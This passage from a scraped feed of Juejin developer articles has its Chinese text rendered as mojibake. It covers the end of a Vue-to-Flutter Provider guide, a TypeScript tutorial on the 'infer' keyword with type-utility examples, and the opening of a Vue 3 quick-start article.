        },
      ),
    ),
  );
}
</code></pre>
<h3 data-id="heading-21">6.2 æ€§èƒ½åˆ†æ</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// ä½¿ç”¨ Flutter DevTools çš„ Performance é¢æ¿</span>
<span class="hljs-comment">// 1. è¿è¡Œåº”ç”¨æ—¶æŒ‰ 'P' æ‰“å¼€æ€§èƒ½é¢æ¿</span>
<span class="hljs-comment">// 2. æŸ¥çœ‹ Widget é‡å»ºæ¬¡æ•°</span>
<span class="hljs-comment">// 3. æ£€æŸ¥æ˜¯å¦æœ‰ä¸å¿…è¦çš„é‡å»º</span>

<span class="hljs-comment">// åœ¨ä»£ç ä¸­æ·»åŠ è°ƒè¯•ä¿¡æ¯</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShoppingList</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'ShoppingList é‡å»º'</span>); <span class="hljs-comment">// æŸ¥çœ‹æ§åˆ¶å°è¾“å‡º</span>
    <span class="hljs-keyword">return</span> Consumer&lt;ShoppingListModel&gt;(
      builder: (context, model, child) {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'Consumer é‡å»ºï¼Œé¡¹ç›®æ•°: <span class="hljs-subst">${model.items.length}</span>'</span>);
        <span class="hljs-keyword">return</span> ...;
      },
    );
  }
}
</code></pre>
<h2 data-id="heading-22">æ€»ç»“ï¼šVue åˆ° Flutter çš„å…³é”®è½¬æ¢</h2>
<ol>
<li><strong>çŠ¶æ€å˜æ›´</strong>ï¼šVue è‡ªåŠ¨è¿½è¸ª vs Flutter æ‰‹åŠ¨ <code>notifyListeners()</code></li>
<li><strong>ç»„ä»¶æ›´æ–°</strong>ï¼šVue è™šæ‹Ÿ DOM diff vs Flutter Widget æ ‘é‡å»º</li>
<li><strong>çŠ¶æ€è®¿é—®</strong>ï¼šVue <code>this.$store</code> vs Flutter <code>Provider.of(context)</code></li>
<li><strong>å“åº”å¼</strong>ï¼šVue è‡ªåŠ¨ä¾èµ–æ”¶é›† vs Flutter æ˜¾å¼å£°æ˜ä¾èµ–</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šVue è®¡ç®—å±æ€§ vs Flutter Selector</li>
</ol>
<p>é€šè¿‡è¿™ä¸ªè¯¦ç»†çš„è´­ç‰©æ¸…å•ç¤ºä¾‹ï¼Œä½ åº”è¯¥èƒ½å¤Ÿå°† Vue çš„çŠ¶æ€ç®¡ç†ç»éªŒé¡ºåˆ©è¿ç§»åˆ° Flutter Providerã€‚è®°ä½æ ¸å¿ƒåŸåˆ™ï¼š<strong>çŠ¶æ€å˜åŒ– â†’ é€šçŸ¥ç›‘å¬è€… â†’ Widget é‡å»º</strong>ï¼Œå…¶ä»–éƒ½æ˜¯å›´ç»•è¿™ä¸ªæœºåˆ¶çš„ä¼˜åŒ–å’Œå®è·µã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Typescriptçš„inferåˆ°åº•æ€ä¹ˆä½¿ç”¨ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7594303751965343790</link>    <guid>https://juejin.cn/post/7594303751965343790</guid>    <pubDate>2026-01-12T11:31:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594303751965343790" data-draft-id="7594270467030663195" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Typescriptçš„inferåˆ°åº•æ€ä¹ˆä½¿ç”¨ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,TypeScript"/> <meta itemprop="datePublished" content="2026-01-12T11:31:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ»¡å¤©æ˜Ÿè¾°"/> <meta itemprop="url" content="https://juejin.cn/user/2771198801097485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Typescriptçš„inferåˆ°åº•æ€ä¹ˆä½¿ç”¨ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2771198801097485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ»¡å¤©æ˜Ÿè¾°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T11:31:51.000Z" title="Mon Jan 12 2026 11:31:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>infer</code>Â æ˜¯ TypeScript ä¸­<strong>æ¡ä»¶ç±»å‹</strong>çš„ä¸€ä¸ªå…³é”®å­—ï¼Œä¸»è¦ç”¨äº<strong>åœ¨æ¡ä»¶ç±»å‹ä¸­è¿›è¡Œç±»å‹æ¨æ–­</strong>ã€‚å®ƒå…è®¸æˆ‘ä»¬åœ¨æ³›å‹æ¡ä»¶ç±»å‹ä¸­<strong>å£°æ˜ä¸€ä¸ªç±»å‹å˜é‡</strong>ï¼Œç„¶åä»å…¶ä»–ç±»å‹ä¸­<strong>æ¨æ–­å‡ºè¿™ä¸ªç±»å‹</strong>ã€‚</p>
<h2 data-id="heading-0">åŸºæœ¬è¯­æ³•</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReturnType</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; infer R ? R : <span class="hljs-built_in">never</span>;
</code></pre>
<h2 data-id="heading-1">ä¸»è¦ä½¿ç”¨åœºæ™¯</h2>
<h3 data-id="heading-2">1.Â <strong>è·å–å‡½æ•°è¿”å›ç±»å‹</strong></h3>
<pre><code class="hljs language-typescr" lang="typescr">// å†…ç½®çš„ ReturnType å®ç°åŸç†
type MyReturnType&lt;T&gt; = T extends (...args: any[]) =&gt; infer R ? R : never;

function foo(): string {
  return "hello";
}

type FooReturn = MyReturnType&lt;typeof foo&gt;; // string
</code></pre>
<h3 data-id="heading-3">2.Â <strong>è·å–å‡½æ•°å‚æ•°ç±»å‹</strong></h3>
<pre><code class="hljs language-typescr" lang="typescr">// è·å–ç¬¬ä¸€ä¸ªå‚æ•°ç±»å‹
type FirstParam&lt;T&gt; = T extends (first: infer P, ...rest: any[]) =&gt; any ? P : never;

// è·å–æ‰€æœ‰å‚æ•°ç±»å‹ï¼ˆå…ƒç»„ï¼‰
type Params&lt;T&gt; = T extends (...args: infer P) =&gt; any ? P : never;

function bar(x: number, y: string): void {}

type BarFirstParam = FirstParam&lt;typeof bar&gt;; // number
type BarParams = Params&lt;typeof bar&gt;; // [number, string]
</code></pre>
<h3 data-id="heading-4">3.Â <strong>è·å–æ•°ç»„/å…ƒç»„å…ƒç´ ç±»å‹</strong></h3>
<p>typescript</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ArrayElement</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> (infer U)[] ? U : <span class="hljs-built_in">never</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">StrArrayElement</span> = <span class="hljs-title class_">ArrayElement</span>&lt;<span class="hljs-built_in">string</span>[]&gt;; <span class="hljs-comment">// string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NumArrayElement</span> = <span class="hljs-title class_">ArrayElement</span>&lt;<span class="hljs-built_in">number</span>[]&gt;; <span class="hljs-comment">// number</span>
</code></pre>
<h3 data-id="heading-5">4.Â <strong>è·å– Promise çš„è§£æç±»å‹</strong></h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">UnwrapPromise</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt; ? U : T;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">PromiseString</span> = <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Unwrapped</span> = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-title class_">PromiseString</span>&gt;; <span class="hljs-comment">// string</span>
</code></pre>
<h2 data-id="heading-6">å®é™…åº”ç”¨ç¤ºä¾‹</h2>
<h3 data-id="heading-7">ç¤ºä¾‹1ï¼šæå–å¯¹è±¡å€¼ç±»å‹</h3>
<pre><code class="hljs language-typescr" lang="typescr">type ValueOf&lt;T&gt; = T extends { [key: string]: infer V } ? V : never;

type Obj = { a: number; b: string };
type Values = ValueOf&lt;Obj&gt;; // number | string
</code></pre>
<h3 data-id="heading-8">ç¤ºä¾‹2ï¼šæå–æ„é€ å‡½æ•°å®ä¾‹ç±»å‹</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">InstanceType</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-keyword">new</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; infer R ? R : <span class="hljs-built_in">any</span>;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
}

<span class="hljs-keyword">type</span> <span class="hljs-title class_">AnimalInstance</span> = <span class="hljs-title class_">InstanceType</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Animal</span>&gt;; <span class="hljs-comment">// Animal</span>
</code></pre>
<h3 data-id="heading-9">ç¤ºä¾‹3ï¼šé€’å½’è§£åŒ…åµŒå¥— Promise</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">DeepUnwrapPromise</span>&lt;T&gt; = 
  T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt; ? <span class="hljs-title class_">DeepUnwrapPromise</span>&lt;U&gt; : T;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">NestedPromise</span> = <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">DeepUnwrapPromise</span>&lt;<span class="hljs-title class_">NestedPromise</span>&gt;; <span class="hljs-comment">// string</span>
</code></pre>
<h2 data-id="heading-10">ä½¿ç”¨æ³¨æ„äº‹é¡¹</h2>
<h3 data-id="heading-11">1.Â <strong>åªèƒ½ç”¨åœ¨æ¡ä»¶ç±»å‹çš„ extends å­å¥ä¸­</strong></h3>
<pre><code class="hljs language-typescr" lang="typescr">// âœ… æ­£ç¡®
type Example1&lt;T&gt; = T extends Array&lt;infer U&gt; ? U : never;

// âŒ é”™è¯¯ï¼šinfer ä¸èƒ½å•ç‹¬ä½¿ç”¨
type Example2&lt;T&gt; = infer U; // ç¼–è¯‘é”™è¯¯
</code></pre>
<h3 data-id="heading-12">2.Â <strong>å¤šä¸ª infer å¯ä»¥åŒæ—¶ä½¿ç”¨</strong></h3>
<pre><code class="hljs language-typescr" lang="typescr">type Zip&lt;T, U&gt; = T extends [infer A, ...infer RestT]
  ? U extends [infer B, ...infer RestU]
    ? [[A, B], ...Zip&lt;RestT, RestU&gt;]
    : []
  : [];

type Result = Zip&lt;[1, 2], ['a', 'b']&gt;; // [[1, 'a'], [2, 'b']]
</code></pre>
<h3 data-id="heading-13">3.Â <strong>åå˜ä½ç½® vs é€†å˜ä½ç½®</strong></h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// infer åœ¨åå˜ä½ç½®ï¼ˆè¿”å›ç±»å‹ï¼‰</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">GetReturnType</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> () =&gt; infer R ? R : <span class="hljs-built_in">never</span>;

<span class="hljs-comment">// infer åœ¨é€†å˜ä½ç½®ï¼ˆå‚æ•°ç±»å‹ï¼‰</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">GetArgType</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> (<span class="hljs-attr">arg</span>: infer A) =&gt; <span class="hljs-built_in">any</span> ? A : <span class="hljs-built_in">never</span>;
</code></pre>
<h2 data-id="heading-14">å®æˆ˜æŠ€å·§</h2>
<h3 data-id="heading-15">1.Â <strong>ç±»å‹å®ˆå«ä¸ infer</strong></h3>
<pre><code class="hljs language-typescr" lang="typescr">function isPromise&lt;T&gt;(value: any): value is Promise&lt;T&gt; {
  return value &amp;&amp; typeof value.then === 'function';
}

async function handle&lt;T&gt;(input: T | Promise&lt;T&gt;): Promise&lt;T&gt; {
  if (isPromise(input)) {
    // è¿™é‡Œ input è¢«æ¨æ–­ä¸º Promise&lt;T&gt;
    return input;
  }
  return Promise.resolve(input);
}
</code></pre>
<h3 data-id="heading-16">2.Â <strong>æ„å»ºå®ç”¨ç±»å‹å·¥å…·</strong></h3>
<pre><code class="hljs language-typescr" lang="typescr">// æå–æ‰€æœ‰æ–¹æ³•çš„è¿”å›ç±»å‹
type MethodsReturnType&lt;T&gt; = {
  [K in keyof T]: T[K] extends (...args: any[]) =&gt; infer R ? R : never;
};

// æå–ç‰¹å®šå±æ€§çš„ç±»å‹
type PropType&lt;T, K extends keyof T&gt; = T extends { [P in K]: infer V } ? V : never;
</code></pre>
<h2 data-id="heading-17">æ€»ç»“</h2>
<p><code>infer</code>Â çš„æ ¸å¿ƒä½œç”¨ï¼š<strong>åœ¨æ¡ä»¶ç±»å‹ä¸­æå–æœªçŸ¥ç±»å‹çš„å†…éƒ¨ç»“æ„</strong>ã€‚å®ƒæ˜¯ TypeScript ç±»å‹ç³»ç»Ÿçš„é«˜çº§ç‰¹æ€§ï¼Œå¸¸ç”¨äºï¼š</p>
<ol>
<li><strong>ç±»å‹æå–</strong>ï¼šä»å·²æœ‰ç±»å‹ä¸­æå–éƒ¨åˆ†ç±»å‹ä¿¡æ¯</li>
<li><strong>ç±»å‹è½¬æ¢</strong>ï¼šå°†ä¸€ä¸ªç±»å‹è½¬æ¢ä¸ºå¦ä¸€ç§å½¢å¼</li>
<li><strong>ç±»å‹æ¨å¯¼</strong>ï¼šæ ¹æ®ä¸Šä¸‹æ–‡æ¨å¯¼å‡ºå…·ä½“ç±»å‹</li>
<li><strong>å·¥å…·ç±»å‹åˆ›å»º</strong>ï¼šæ„å»ºå¤æ‚çš„å®ç”¨ç±»å‹å·¥å…·</li>
</ol>
<p>æŒæ¡Â <code>infer</code>Â çš„å…³é”®æ˜¯å¤šå®è·µï¼Œä»ç®€å•çš„å‡½æ•°è¿”å›ç±»å‹æå–å¼€å§‹ï¼Œé€æ­¥åº”ç”¨åˆ°æ›´å¤æ‚çš„ç±»å‹æ“ä½œä¸­ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vue3å¿«é€Ÿå…¥é—¨]]></title>    <link>https://juejin.cn/post/7594028166135562240</link>    <guid>https://juejin.cn/post/7594028166135562240</guid>    <pubDate>2026-01-12T12:18:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594028166135562240" data-draft-id="7594028166135513088" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vue3å¿«é€Ÿå…¥é—¨"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-12T12:18:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·24825782481"/> <meta itemprop="url" content="https://juejin.cn/user/4329195838661722"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vue3å¿«é€Ÿå…¥é—¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4329195838661722/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·24825782481
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T12:18:05.000Z" title="Mon Jan 12 2026 12:18:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€å‡†å¤‡</h2>
<h4 data-id="heading-1">1ã€å¼•å…¥vueæ¨¡å—,å¯¼å…¥createAppå‡½æ•°</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f30e6a52f65842b5a732c68aa8e2f674~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=mHA4B3XhW%2BF0UE9OmGKt5cqbxUQ%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-2">2ã€åˆ›å»ºvueç¨‹åºåº”ç”¨å®ä¾‹</h4>
<p>createAppå‡½æ•°å¤§æ‹¬å·è¿›è¡Œä¼ å‚
